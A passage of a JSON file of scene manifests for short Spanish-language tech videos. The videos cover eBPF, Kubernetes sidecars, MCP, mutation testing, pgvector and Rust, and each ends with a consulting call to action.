              "color": "#10b981",
              "cmd": "duckdb server.duckdb --readonly",
              "status": "Motor C++ embebido en contenedor",
              "time": "$80/mes",
              "lines": [
                "Almacenamiento en S3 estándar: $45",
                "Instancia Hetzner 64GB RAM: $35",
                "Formato abierto Parquet / Apache Iceberg"
              ]
            }
          }
        },
        {
          "id": "cta_duckdb_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito la arquitectura de datos de tu empresa para recortar sobrecostes de infraestructura. Escríbeme o agenda tu sesión en el link de mi perfil.",
          "visual_cue": "Cierre con auditoría de infraestructura de datos",
          "props": {
            "header": "AUDITORÍA DE INFRAESTRUCTURA",
            "title": "OPTIMIZACIÓN DE PIPELINES DE DATOS",
            "cta": {
              "badge": "AUDITORÍA DE COSTES // SEDEV",
              "text": "Recorta hasta un 80% en tu infraestructura de analítica. Enlace directo en mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "04_A",
    "topicNum": "04",
    "group": "04. EBPF LINUX KERNEL",
    "label": "Var A (Técnico): eBPF: Cómo el Kernel de Linux intercepta tráfico a velocidad hardware",
    "variation": "A (Técnico)",
    "category": "SISTEMAS OPERATIVOS & OBSERVABILIDAD",
    "manifest": {
      "title": "[04] eBPF: Cómo el Kernel de Linux intercepta tráfico a velocidad hardware (Var A)",
      "category": "SISTEMAS OPERATIVOS & OBSERVABILIDAD",
      "slug": "04_ebpf_linux_kernel",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_ebpf",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "¿Cómo monitorizar y asegurar cada paquete de red sin tocar una sola línea de código de tu aplicación? Con eBPF en el Kernel de Linux.",
          "visual_cue": "Gancho cinético con escudo de kernel Linux",
          "props": {
            "badge": "KERNEL DE LINUX 2026",
            "lines": [
              {
                "text": "EBPF: REVOLUCIÓN",
                "color": "#ffffff"
              },
              {
                "text": "EN EL KERNEL",
                "color": "#f59e0b"
              }
            ],
            "subtitle": "SANDBOX SEGURO A NIVEL DE SISTEMA OPERATIVO",
            "icon": "kernel_shield"
          }
        },
        {
          "id": "kernel_pipe",
          "type": "network_pipeline",
          "duration": 6.5,
          "voiceover": "eBPF permite ejecutar bytecode verificado dentro del kernel. Los paquetes se filtran y analizan antes de que lleguen al espacio de usuario.",
          "visual_cue": "Pipeline visual mostrando la intercepción en el kernel sin copias a user space",
          "props": {
            "header": "ARQUITECTURA DE RED EN KERNEL",
            "title": "INSPECCIÓN EN TIEMPO REAL SIN COPÍAS",
            "subtitle": "BYTECODE VERIFICADO // ZERO USER-SPACE OVERHEAD",
            "stages": [
              {
                "id": "nic",
                "label": "TARJETA DE RED (NIC)",
                "sub": "Llegada de paquetes Ethernet",
                "y": 220,
                "color": "#06b6d4",
                "metric": "40 Gbps"
              },
              {
                "id": "ebpf",
                "label": "EBPF PROGRAM (XDP)",
                "sub": "Intercepción en Ring Buffer del Kernel",
                "y": 520,
                "color": "#f59e0b",
                "metric": "0.005ms"
              },
              {
                "id": "app",
                "label": "USER SPACE RUNTIME",
                "sub": "Solo recibe paquetes legítimos",
                "y": 820,
                "color": "#10b981",
                "metric": "Zero CPU waste"
              }
            ]
          }
        },
        {
          "id": "ebpf_code",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "El verificador de Linux garantiza matemáticamente que el código eBPF nunca entrará en bucles infinitos ni causará un kernel panic.",
          "visual_cue": "Terminal mostrando programa C en eBPF verificando cabeceras IP",
          "props": {
            "header": "CÓDIGO DE KERNEL SEGURO",
            "title": "HOOK DE RED CON XDP",
            "filename": "kernel/filter.bpf.c",
            "codeLines": [
              "SEC(\"xdp\")",
              "int filter_packets(struct xdp_md *ctx) {",
              "  void *data = (void *)(long)ctx->data;",
              "  void *data_end = (void *)(long)ctx->data_end;",
              "  // Verificación estricta de límites por el kernel",
              "  if (data + sizeof(struct ethhdr) > data_end) return XDP_PASS;",
              "  return XDP_DROP; // Bloqueo a velocidad de silicio",
              "}"
            ],
            "cursorLine": 7
          }
        },
        {
          "id": "cta_ebpf",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Diseño arquitecturas de observabilidad y seguridad de bajo impacto en infraestructura Linux. Contáctame en el link de la bio.",
          "visual_cue": "Cierre con consultoría de infraestructura y sistemas",
          "props": {
            "header": "CONSULTORÍA DE INFRAESTRUCTURA",
            "title": "OBSERVABILIDAD & SEGURIDAD EN LINUX",
            "cta": {
              "badge": "INGENIERÍA DE SISTEMAS // SEDEV",
              "text": "¿Problemas de rendimiento u observabilidad en Linux? Link en mi perfil para agendar una sesión."
            }
          }
        }
      ]
    }
  },
  {
    "key": "04_B",
    "topicNum": "04",
    "group": "04. EBPF LINUX KERNEL",
    "label": "Var B (Polémico): Muerte a los Sidecars de Kubernetes: Por qué eBPF lo cambia todo",
    "variation": "B (Polémico)",
    "category": "SISTEMAS OPERATIVOS & OBSERVABILIDAD",
    "manifest": {
      "title": "[04] Muerte a los Sidecars de Kubernetes: Por qué eBPF lo cambia todo (Var B)",
      "category": "SISTEMAS OPERATIVOS & OBSERVABILIDAD",
      "slug": "04_ebpf_linux_kernel",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_ebpf_b",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "Meter un sidecar proxy en cada contenedor de Kubernetes está destruyendo el rendimiento de tus servidores. eBPF vino a matarlos.",
          "visual_cue": "Gancho cinético contra el abuso de sidecars",
          "props": {
            "badge": "KUBERNETES EN 2026",
            "lines": [
              {
                "text": "EL FIN DE LOS",
                "color": "#ef4444"
              },
              {
                "text": "SIDECARS EN K8S",
                "color": "#ffffff"
              }
            ],
            "subtitle": "ELIMINANDO LA SOBRECARGA DE SERVICE MESH",
            "icon": "kernel_shield"
          }
        },
        {
          "id": "sidecar_overhead",
          "type": "tradeoff_matrix",
          "duration": 6,
          "voiceover": "Cada sidecar de Envoy duplica el uso de memoria y añade saltos TCP locales innecesarios. Cilium con eBPF maneja la red directamente en el kernel.",
          "visual_cue": "Matriz comparando Istio/Envoy vs Cilium eBPF",
          "props": {
            "header": "SERVICE MESH OVERHEAD",
            "title": "ENVOY SIDECARS VS CILIUM EBPF",
            "colA": "CILIUM EBPF (KERNEL)",
            "colB": "ISTIO / ENVOY SIDECAR",
            "rows": [
              {
                "dim": "Memoria por Pod",
                "a": "0 MB extra",
                "b": "150-250 MB por pod",
                "aGood": true
              },
              {
                "dim": "Saltos TCP en Loopback",
                "a": "0 hops (Socket direct)",
                "b": "4 hops por petición",
                "aGood": true
              },
              {
                "dim": "Cifrado mTLS",
                "a": "WireGuard en Kernel",
                "b": "mTLS en User Space",
                "aGood": true
              }
            ]
          }
        },
        {
          "id": "cta_ebpf_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito la arquitectura de red y el gasto en clústeres de Kubernetes para eliminar fricción y sobrecostes. Enlace directo en mi perfil.",
          "visual_cue": "Cierre con auditoría de infraestructura y clusters",
          "props": {
            "header": "AUDITORÍA DE INFRAESTRUCTURA",
            "title": "OPTIMIZA TU CLÚSTER KUBERNETES",
            "cta": {
              "badge": "AUDITORÍA DE K8S // SEDEV",
              "text": "Elimina sobrecargas en tus clústeres. Link en mi biografía para agendar tu diagnóstico."
            }
          }
        }
      ]
    }
  },
  {
    "key": "05_A",
    "topicNum": "05",
    "group": "05. MCP AGENT HARNESS",
    "label": "Var A (Técnico): Model Context Protocol (MCP): El estándar universal para IA y código",
    "variation": "A (Técnico)",
    "category": "AI ENGINEERING & AGENT PROTOCOLS",
    "manifest": {
      "title": "[05] Model Context Protocol (MCP): El estándar universal para IA y código (Var A)",
      "category": "AI ENGINEERING & AGENT PROTOCOLS",
      "slug": "05_mcp_agent_harness",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_mcp",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "El prompt engineering murió. La verdadera ingeniería de IA en 2026 se llama Model Context Protocol: el estándar que conecta modelos a tus sistemas.",
          "visual_cue": "Gancho cinético sobre el protocolo MCP",
          "props": {
            "badge": "INGENIERÍA DE IA 2026",
            "lines": [
              {
                "text": "MODEL CONTEXT",
                "color": "#ffffff"
              },
              {
                "text": "PROTOCOL (MCP)",
                "color": "#a855f7"
              }
            ],
            "subtitle": "EL ESTÁNDAR ABIERTO PARA AGENTES AUTÓNOMOS",
            "icon": "agent_loop"
          }
        },
        {
          "id": "mcp_arch",
          "type": "architecture_flow",
          "duration": 6.5,
          "voiceover": "En vez de escribir código ad-hoc para cada modelo, MCP crea una interfaz cliente-servidor donde la IA descubre herramientas y contexto dinámicamente.",
          "visual_cue": "Diagrama de arquitectura MCP: Modelo LLM <-> Cliente MCP <-> Servidores de Herramientas (Postgres, Git, Filesystem)",
          "props": {
            "header": "ARQUITECTURA DE PROTOCOLO",
            "title": "DESACOPLAMIENTO DE HERRAMIENTAS",
            "nodes": [
              {
                "id": "llm",
                "label": "AGENTE / CLIENTE MCP",
                "sublabel": "Claude Code // Cursor // Custom Runner",
                "color": "#a855f7",
                "y": 160
              },
              {
                "id": "protocol",
                "label": "PROTOCOLO JSON-RPC 2.0",
                "sublabel": "Capabilities Negotiation // Tools & Resources",
                "color": "#38bdf8",
                "y": 520
              },
              {
                "id": "servers",
                "label": "SERVIDORES MCP AISLADOS",
                "sublabel": "PostgreSQL // GitHub // Terminal Shell",
                "color": "#10b981",
                "y": 880
              }
            ]
          }
        },
        {
          "id": "mcp_terminal",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "Un servidor MCP expone esquemas en JSON estricto. La IA invoca funciones con tipado seguro y maneja errores sin alucinaciones.",
          "visual_cue": "Terminal mostrando definición de herramienta en servidor MCP con TypeScript",
          "props": {
            "header": "ESPECIFICACIÓN DE HERRAMIENTAS",
            "title": "SERVIDOR MCP EN TYPESCRIPT",
            "filename": "mcp/database_server.ts",
            "codeLines": [
              "server.setRequestHandler(ListToolsRequestSchema, async () => ({",
              "  tools: [{",
              "    name: \"query_database\",",
              "    description: \"Ejecuta consultas de solo lectura en Postgres\",",
              "    inputSchema: zodToJsonSchema(QuerySchema)",
              "  }]",
              "}));"
            ],
            "cursorLine": 6
          }
        },
        {
          "id": "cta_mcp",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Diseño e integro agentes autónomos y servidores MCP para flujos empresariales complejos. Si buscas un desarrollador senior para liderar tu proyecto de IA, link en mi bio.",
          "visual_cue": "Cierre con contratación senior backend / IA",
          "props": {
            "header": "DESARROLLO SENIOR BACKEND & IA",
            "title": "ARQUITECTURAS AGÉNTICAS A MEDIDA",
            "cta": {
              "badge": "STAFF ENGINEER // SEDEV",
              "text": "¿Necesitas integrar agentes de IA en tu infraestructura? Hablemos en el enlace de mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "05_B",
    "topicNum": "05",
    "group": "05. MCP AGENT HARNESS",
    "label": "Var B (Polémico): El \"Prompting\" ha muerto: Por qué la industria se mudó a los arneses de IA",
    "variation": "B (Polémico)",
    "category": "AI ENGINEERING & AGENT PROTOCOLS",
    "manifest": {
      "title": "[05] El \"Prompting\" ha muerto: Por qué la industria se mudó a los arneses de IA (Var B)",
      "category": "AI ENGINEERING & AGENT PROTOCOLS",
      "slug": "05_mcp_agent_harness",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_mcp_b",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "Hacer prompts gigantescos no te dará software de producción. Lo que importa es el arnés de ejecución y las herramientas que le das al modelo.",
          "visual_cue": "Gancho cinético sobre la muerte del prompt engineering",
          "props": {
            "badge": "DEBATES DE INGENIERÍA",
            "lines": [
              {
                "text": "EL PROMPTING",
                "color": "#ef4444"
              },
              {
                "text": "HA MUERTO",
                "color": "#ffffff"
              }
            ],
            "subtitle": "EL PODER ESTÁ EN EL ARNÉS DE EJECUCIÓN",
            "icon": "agent_loop"
          }
        },
        {
          "id": "split_prompt_vs_harness",
          "type": "terminal_split",
          "duration": 6,
          "voiceover": "Un mal prompt en un buen arnés con tests automáticos gana siempre a un prompt perfecto sin capacidad de ejecución.",
          "visual_cue": "Doble terminal: Vibe Prompting vs Agent Harness con bucle de verificación",
          "props": {
            "header": "MÉTODO DE DESARROLLO",
            "title": "PROMPT PURO VS BUCLE DE VERIFICACIÓN",
            "termA": {
              "title": "PROMPTING TRADICIONAL",
              "color": "#ef4444",
              "cmd": "chat_gpt(\"escribe un backend completo\")",
              "status": "Alucinaciones en imports y dependencias",
              "time": "Fallo silente",
              "lines": [
                "Genera 500 líneas de código sin verificar",
                "Usa librerías deprecadas o inexistentes",
                "Cero tests de ejecución"
              ]
            },
            "termB": {
              "title": "AGENT HARNESS DETERMINISTA",
              "color": "#10b981",
              "cmd": "agent run --verify --strict-sandbox",
              "status": "Ejecuta tests, detecta errores y autocorrige",
              "time": "✔ Verificado",
              "lines": [
                "Llama a servidor MCP para validar esquema de DB",
                "Corre suite de tests unitarios antes de commitear",
                "Feedback loop determinista en tiempo real"
              ]
            }
          }
        },
        {
          "id": "cta_mcp_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Construyo arneses de automatización e integraciones complejas para empresas. Si necesitas un ingeniero especializado en flujos de IA, link en mi biografía.",
          "visual_cue": "Cierre con contratación directa senior",
          "props": {
            "header": "CONTRATACIÓN SENIOR BACKEND",
            "title": "SISTEMAS AUTÓNOMOS Y AGENTES ROBUSTOS",
            "cta": {
              "badge": "LEAD DEVELOPER // SEDEV",
              "text": "Desarrollo de agentes y flujos autónomos de alta fiabilidad. Contáctame en mi biografía."
            }
          }
        }
      ]
    }
  },
  {
    "key": "06_A",
    "topicNum": "06",
    "group": "06. VERIFICACION VS VIBE CODING",
    "label": "Var A (Técnico): Mutation & Property-Based Testing: Verificando código de IA",
    "variation": "A (Técnico)",
    "category": "CALIDAD DE SOFTWARE & TESTING",
    "manifest": {
      "title": "[06] Mutation & Property-Based Testing: Verificando código de IA (Var A)",
      "category": "CALIDAD DE SOFTWARE & TESTING",
      "slug": "06_verificacion_vs_vibe_coding",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_testing",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "Generar código con IA es instantáneo; verificar que no destruya producción a las tres de la madrugada es el verdadero reto.",
          "visual_cue": "Gancho cinético sobre el cuello de botella del testing",
          "props": {
            "badge": "INGENIERÍA DE SOFTWARE 2026",
            "lines": [
              {
                "text": "EL CUELLO DE BOTELLA",
                "color": "#ffffff"
              },
              {
                "text": "DE LA VERIFICACIÓN",
                "color": "#ef4444"
              }
            ],
            "subtitle": "PROPERTY-BASED & MUTATION TESTING",
            "icon": "check_circle"
          }
        },
        {
          "id": "mutation_terminal",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "El mutation testing inyecta fallos intencionales en tu código. Si tus tests no fallan ante un mutante, tus tests son una falsa sensación de seguridad.",
          "visual_cue": "Terminal ejecutando mutaciones sobre la suite de tests",
          "props": {
            "header": "MUTATION TESTING EN CI",
            "title": "STRYKER / MUTATION ENGINE",
            "filename": "tests/mutation.log",
            "codeLines": [
              "stryker run --concurrency=8",
              "Injecting mutation: replaced \">=\" with \">\" at auth.ts:42",
              "Running test suite against mutant #104...",
              "❌ MUTANT SURVIVED: Tests did not detect logic change!",
              "Score de mutación: 68% // Requiere endurecer assertions"
            ],
            "cursorLine": 4
          }
        },
        {
          "id": "property_testing",
          "type": "tradeoff_matrix",
          "duration": 6,
          "voiceover": "En vez de probar tres casos aislados, los tests basados en propiedades generan diez mil combinaciones de datos aleatorios para romper tu lógica.",
          "visual_cue": "Matriz comparando Unit Tests manuales vs Property-Based Testing",
          "props": {
            "header": "MÉTODOS DE COMPROBACIÓN",
            "title": "UNIT TESTS VS PROPERTY TESTING",
            "colA": "PROPERTY-BASED TESTING",
            "colB": "TESTS MANUALES BÁSICOS",
            "rows": [
              {
                "dim": "Entradas probadas",
                "a": "10.000 generadas por run",
                "b": "3 o 4 ejemplos fijos",
                "aGood": true
              },
              {
                "dim": "Edge cases ocultos",
                "a": "Detecta desbordamientos",
                "b": "Ignora casos límite",
                "aGood": true
              },
              {
                "dim": "Resistencia a mutantes",
                "a": "Alta cobertura real",
                "b": "Falso 100% de coverage",
                "aGood": true
              }
            ]
          }
        },
        {
          "id": "cta_testing",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito suites de prueba y diseño pipelines de verificación determinista para equipos de desarrollo. Link en mi perfil para agendar una sesión.",
          "visual_cue": "Cierre con auditoría de calidad de software",
          "props": {
            "header": "AUDITORÍA DE CALIDAD & TESTING",
            "title": "BLINDA TU SOFTWARE EN PRODUCCIÓN",
            "cta": {
              "badge": "AUDITORÍA DE CALIDAD // SEDEV",
              "text": "¿Dudas de la fiabilidad de tu código autogenerado? Link en bio para auditar tus suites de prueba."
            }
          }
        }
      ]
    }
  },
  {
    "key": "06_B",
    "topicNum": "06",
    "group": "06. VERIFICACION VS VIBE CODING",
    "label": "Var B (Polémico): \"Vibe Coding\" es una bomba de tiempo: Por qué la deuda explotará",
    "variation": "B (Polémico)",
    "category": "CALIDAD DE SOFTWARE & TESTING",
    "manifest": {
      "title": "[06] \"Vibe Coding\" es una bomba de tiempo: Por qué la deuda explotará (Var B)",
      "category": "CALIDAD DE SOFTWARE & TESTING",
      "slug": "06_verificacion_vs_vibe_coding",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_testing_b",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "Aceptar sugerencias de IA sin entender cómo funcionan no es programar rápido: es firmar una hipoteca de deuda técnica que vas a pagar muy cara.",
          "visual_cue": "Gancho cinético alertando del vibe coding descontrolado",
          "props": {
            "badge": "DEBATES DE LA INDUSTRIA",
            "lines": [
              {
                "text": "\"VIBE CODING\" ES UNA",
                "color": "#ffffff"
              },
              {
                "text": "BOMBA DE TIEMPO",
                "color": "#ef4444"
              }
            ],
            "subtitle": "DEUDA TÉCNICA A VELOCIDAD DE LA LUZ",
            "icon": "zero_trust_lock"
          }
        },
        {
          "id": "split_vibe_vs_eng",
          "type": "terminal_split",
          "duration": 6,
          "voiceover": "El código barato de escribir es carísimo de mantener si nadie en el equipo sabe cómo depurarlo cuando colapse el servicio.",
          "visual_cue": "Doble terminal: Vibe Coder improvisando vs Ingeniero aplicando verificación",
          "props": {
            "header": "EL COSTE OCULTO",
            "title": "ILUSIÓN DE VELOCIDAD VS MANTENIMIENTO",
            "termA": {
              "title": "EQUIPO \"VIBE CODING\"",
              "color": "#ef4444",
              "cmd": "git commit -m \"parece que funciona en local\"",
              "status": "32 dependencias fantasma añadidas",
              "time": "Caída p99",
              "lines": [
                "Memoria con fugas silentes en event listeners",
                "Nadie entiende el archivo de 1,200 líneas generado",
                "Tiempo medio de resolución de incidencias: 3 días"
              ]
            },
            "termB": {
              "title": "INGENIERÍA RIGUROSA",
              "color": "#10b981",
              "cmd": "cargo test --all-features && cargo clippy",
              "status": "Cero warnings, tipos estrictos y límites claros",
              "time": "Estable 24/7",
              "lines": [
                "Invariantes de negocio validados en el sistema de tipos",
                "Arquitectura modular documentada y legible",
                "MTTR (tiempo de recuperación): 5 minutos"
              ]
            }
          }
        },
        {
          "id": "cta_testing_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Ayudo a empresas a sanear bases de código y frenar la deuda técnica generada por IA. Contáctame en el enlace de mi perfil.",
          "visual_cue": "Cierre con auditoría de deuda técnica",
          "props": {
            "header": "AUDITORÍA DE DEUDA TÉCNICA",
            "title": "RECUPERA EL CONTROL DE TU CODEBASE",
            "cta": {
              "badge": "AUDITORÍA DE ARQUITECTURA // SEDEV",
              "text": "¿Tu codebase se volvió inmanejable? Hablemos en el link de la biografía."
            }
          }
        }
      ]
    }
  },
  {
    "key": "07_A",
    "topicNum": "07",
    "group": "07. PGVECTOR VS VECTORDB",
    "label": "Var A (Técnico): Algoritmo HNSW en memoria: Grafos vectoriales en PostgreSQL",
    "variation": "A (Técnico)",
    "category": "BASES DE DATOS & IA",
    "manifest": {
      "title": "[07] Algoritmo HNSW en memoria: Grafos vectoriales en PostgreSQL (Var A)",
      "category": "BASES DE DATOS & IA",
      "slug": "07_pgvector_vs_vectordb",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_pgvector",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "¿Cómo busca PostgreSQL entre un millón de vectores de IA en menos de cinco milisegundos? Con grafos HNSW.",
          "visual_cue": "Gancho cinético con icono de árbol y base de datos",
          "props": {
            "badge": "POSTGRESQL & IA 2026",
            "lines": [
              {
                "text": "GRAFOS HNSW EN",
                "color": "#ffffff"
              },
              {
                "text": "PGVECTOR",
                "color": "#38bdf8"
              }
            ],
            "subtitle": "BÚSQUEDA SEMÁNTICA VECTORIZADA",
            "icon": "tree"
          }
        },
        {
          "id": "hnsw_tree",
          "type": "tree_hierarchy",
          "duration": 6.5,
          "voiceover": "HNSW crea capas jerárquicas de grafos navegables. La búsqueda empieza en la capa superior con saltos largos y desciende refinando la similitud.",
          "visual_cue": "Jerarquía de árbol navegable mostrando saltos hasta encontrar el vector objetivo",
          "props": {
            "header": "ALGORITMO HNSW",
            "title": "HIERARCHICAL NAVIGABLE SMALL WORLD",
            "complexity": "COMPLEJIDAD: O(log N) // DISTANCIA COSENO",
            "nodes": [
              {
                "id": "top",
                "label": "CAPA 2: SALTOS LARGOS",
                "x": 480,
                "y": 240,
                "level": 0
              },
              {
                "id": "mid1",
                "label": "CAPA 1: CLUSTER A",
                "x": 260,
                "y": 520,
                "level": 1,
                "parent": "top"
              },
              {
                "id": "mid2",
                "label": "CAPA 1: CLUSTER B",
                "x": 700,
                "y": 520,
                "level": 1,
                "parent": "top"
              },
              {
                "id": "leaf",
                "label": "TARGET: SIMILARITY 0.94",
                "x": 260,
                "y": 840,
                "level": 2,
                "parent": "mid1",
                "target": true
              }
            ],
            "footerBadge": "RENDIMIENTO HNSW EN POSTGRES",
            "footerText": "Recorre un grafo multidimensional en RAM sin escanear la tabla entera.",
            "footerSubtext": "Búsqueda por similitud semántica en menos de 4ms."
          }
        },
        {
          "id": "pg_sql",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "Lo mejor es que puedes combinar búsqueda de similitud semántica con filtros relacionales clásicos en una sola consulta SQL transaccional.",
          "visual_cue": "Terminal ejecutando query combinada en PostgreSQL con pgvector",
          "props": {
            "header": "CONSULTA HÍBRIDA EN POSTGRES",
            "title": "FILTRO RELACIONAL + VECTOR SEARCH",
            "filename": "db/hybrid_search.sql",
            "codeLines": [
              "SELECT id, title, (embedding <=> $1) as distance",
              "FROM articles",
              "WHERE user_id = 42 AND published_at > NOW() - INTERVAL \"30 days\"",
              "ORDER BY embedding <=> $1",
              "LIMIT 5;",
              "-- Ejecución: 3.8ms usando índice HNSW"
            ],
            "cursorLine": 5
          }
        },
        {
          "id": "cta_pgvector",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Si quieres implementar búsqueda semántica o auditar tu arquitectura de datos para IA sin sobrecostes innecesarios, link en mi perfil.",
          "visual_cue": "Cierre con llamado a auditoría de bases de datos",
          "props": {
            "header": "AUDITORÍA DE BASES DE DATOS & IA",
            "title": "OPTIMIZA TUS PIPELINES DE EMBEDDINGS",
            "cta": {
              "badge": "AUDITORÍA DE DATOS // SEDEV",
              "text": "¿Búsquedas vectoriales lentas o caras? Hablemos en el enlace de mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "07_B",
    "topicNum": "07",
    "group": "07. PGVECTOR VS VECTORDB",
    "label": "Var B (Polémico): No necesitas Pinecone: Todo tu stack de IA cabe en Postgres",
    "variation": "B (Polémico)",
    "category": "BASES DE DATOS & IA",
    "manifest": {
      "title": "[07] No necesitas Pinecone: Todo tu stack de IA cabe en Postgres (Var B)",
      "category": "BASES DE DATOS & IA",
      "slug": "07_pgvector_vs_vectordb",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_pgvector_b",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "Te vendieron que necesitas una base vectorial especializada como Pinecone o Qdrant para hacer IA. La verdad es que tu Postgres actual ya lo hace todo.",
          "visual_cue": "Gancho cinético contra el exceso de herramientas",
          "props": {
            "badge": "SIMPLICIDAD DE ARQUITECTURA",
            "lines": [
              {
                "text": "NO NECESITAS",
                "color": "#ef4444"
              },
              {
                "text": "PINECONE",
                "color": "#ffffff"
              }
            ],
            "subtitle": "TODO TU STACK DE IA CABE EN POSTGRES",
            "icon": "database"
          }
        },
        {
          "id": "split_pinecone_pg",
          "type": "terminal_split",
          "duration": 6,
          "voiceover": "Mantener dos bases de datos te obliga a sincronizar IDs y transacciones. Con pgvector tienes consistencia inmediata sin pagar dos servicios.",
          "visual_cue": "Doble terminal comparando sincronización dual vs base única",
          "props": {
            "header": "COMPLEJIDAD OPERATIVA",
            "title": "DOS BASES DE DATOS VS UNA SOLA",
            "termA": {
              "title": "POSTGRES + PINECONE EXTERNO",
              "color": "#ef4444",
              "cmd": "sync_worker.py (Sincronizando IDs)",
              "status": "Inconsistencias cuando falla la red",
              "time": "$340/mes extra",
              "lines": [
                "Si el delete falla en Pinecone, quedan embeddings huérfanos",
                "Doble factura: Base de datos + Proveedor vectorial",
                "Latencia añadida entre dos nubes distintas"
              ]
            },
            "termB": {
              "title": "POSTGRESQL NATIVO (PGVECTOR)",
              "color": "#10b981",
              "cmd": "CREATE INDEX USING hnsw (embedding vector_cosine_ops)",
              "status": "Transacciones ACID nativas",
              "time": "$0 extra",
              "lines": [
                "Un solo respaldo con pg_dump",
                "Join directo entre tablas relacionales y embeddings",
                "Cero sincronizaciones en segundo plano"
              ]
            }
          }
        },
        {
          "id": "cta_pgvector_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito la capa de persistencia de tu producto para consolidar tu stack y reducir costes operativos. Agenda tu sesión técnica en el link de la bio.",
          "visual_cue": "Cierre con auditoría de base de datos",
          "props": {
            "header": "AUDITORÍA DE BASES DE DATOS",
            "title": "SIMPLIFICA TU CAPA DE PERSISTENCIA",
            "cta": {
              "badge": "AUDITORÍA DE DATOS // SEDEV",
              "text": "Consolida tus bases de datos y ahorra costes. Link en mi perfil para agendar tu auditoría."
            }
          }
        }
      ]
    }
  },
  {
    "key": "08_A",
    "topicNum": "08",
    "group": "08. RUST SISTEMAS CRITICOS",
    "label": "Var A (Técnico): El Borrow Checker de Rust: Cero fugas de memoria sin GC",
    "variation": "A (Técnico)",
    "category": "LENGUAJES DE SISTEMAS & RENDIMIENTO",
    "manifest": {
      "title": "[08] El Borrow Checker de Rust: Cero fugas de memoria sin GC (Var A)",
      "category": "LENGUAJES DE SISTEMAS & RENDIMIENTO",
      "slug": "08_rust_sistemas_criticos",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_rust",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "¿Cómo garantizar que un programa nunca tendrá fugas de memoria ni condiciones de carrera sin usar un recolector de basura? Con Rust.",
          "visual_cue": "Gancho cinético con engranaje industrial de Rust",
          "props": {
            "badge": "SISTEMAS CRÍTICOS 2026",
            "lines": [
              {
                "text": "EL BORROW CHECKER",
                "color": "#ffffff"
              },
              {
                "text": "DE RUST EXPLICADO",
                "color": "#f97316"
              }
            ],
            "subtitle": "SEGURIDAD DE MEMORIA EN TIEMPO DE COMPILACIÓN",
            "icon": "rust_gear"
          }
        },
        {
          "id": "memory_borrow",
          "type": "memory_layout",
          "duration": 6,
          "voiceover": "En Rust, cada recurso tiene un único dueño. Cuando la variable sale de su ámbito, la memoria se libera al instante sin pausas de ejecución.",
          "visual_cue": "Distribución de memoria Stack vs Heap y liberación sin recolector",
          "props": {
            "header": "GESTIÓN ESTÁTICA DE MEMORIA",
            "title": "PROPIEDAD Y PRÉSTAMOS (OWNERSHIP)",
            "items": [
              {
                "name": "STACK FRAME // SCOPE ACTIVO",
                "addr": "0x7fff001",
                "value": "Buffer asignado // Dueño: `data`",
                "color": "#10b981"
              },
              {
                "name": "DROP AUTOMÁTICO AL SALIR",
                "addr": "0x7fff002",
                "value": "Cero pausas de Garbage Collector (0ns)",
                "color": "#38bdf8"
              }
            ]
          }
        },
        {
          "id": "rust_code",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "Si intentas compartir un puntero mutable entre dos hilos a la vez, el compilador se niega a generar el binario. Cero sorpresas en producción.",
          "visual_cue": "Terminal mostrando error del borrow checker previniendo una condición de carrera",
          "props": {
            "header": "PREVENCIÓN EN COMPILACIÓN",
            "title": "EL COMPILADOR DEFIENDE TU SISTEMA",
            "filename": "src/concurrency.rs",
            "codeLines": [
              "fn process(shared: &mut Data) {",
              "  thread::spawn(move || {",
              "    shared.mutate(); // ❌ ERROR E0502: Cannot borrow `shared`",
              "  });",
              "  shared.read(); // as mutable more than once at a time",
              "}"
            ],
            "cursorLine": 4
          }
        },
        {
          "id": "cta_rust",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Diseño servicios backend de alto rendimiento y baja latencia en Rust y Go. Si buscas un desarrollador senior para liderar tu sistema, link en mi perfil.",
          "visual_cue": "Cierre con contratación senior backend",
          "props": {
            "header": "CONTRATACIÓN SENIOR / STAFF ENGINEER",
            "title": "DESARROLLO DE SISTEMAS DE ALTA CONCURRENCIA",
            "cta": {
              "badge": "STAFF BACKEND DEVELOPER // SEDEV",
              "text": "¿Necesitas desarrollo en Rust o Go para sistemas críticos? Contáctame en el link de la bio."
            }
          }
        }
      ]
    }
  },
  {
    "key": "08_B",
